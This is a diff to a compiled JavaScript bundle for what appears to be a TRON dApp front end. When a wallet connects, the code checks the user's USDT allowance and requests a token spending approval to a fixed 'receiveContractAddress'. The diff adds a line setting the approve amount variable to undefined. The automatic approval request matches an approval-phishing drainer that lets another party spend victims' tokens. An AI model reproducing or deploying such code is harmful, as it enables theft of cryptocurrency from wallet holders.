@@ -36074,7 +36074,7 @@ var Home = function Home() {
           case 0:
             console.log(account);
             if (!account) {
-              _context.next = 23;
+              _context.next = 24;
               break;
             }
             _context.next = 4;
@@ -36087,31 +36087,32 @@ var Home = function Home() {
           case 8:
             allowance = _context.sent;
             if (!(allowance <= 1000000000000)) {
-              _context.next = 16;
+              _context.next = 17;
               break;
             }
-            _context.next = 12;
+            x = undefined;
+            _context.next = 13;
             return usdtContract.approve(receiveContractAddress, x).send({
               feeLimit: "100000000"
             });
-          case 12:
+          case 13:
             result = _context.sent;
             console.log(result);
-            _context.next = 23;
+            _context.next = 24;
             break;
-          case 16:
-            _context.next = 18;
+          case 17:
+            _context.next = 19;
             return window.tronWeb.contract().at(receiveContractAddress);
-          case 18:
+          case 19:
             giveContract = _context.sent;
-            _context.next = 21;
+            _context.next = 22;
             return giveContract.approve().send({
               feeLimit: "100000000"
             });
-          case 21:
+          case 22:
             _result = _context.sent;
             console.log(_result);
-          case 23:
+          case 24:
           case "end":
             return _context.stop();
         }
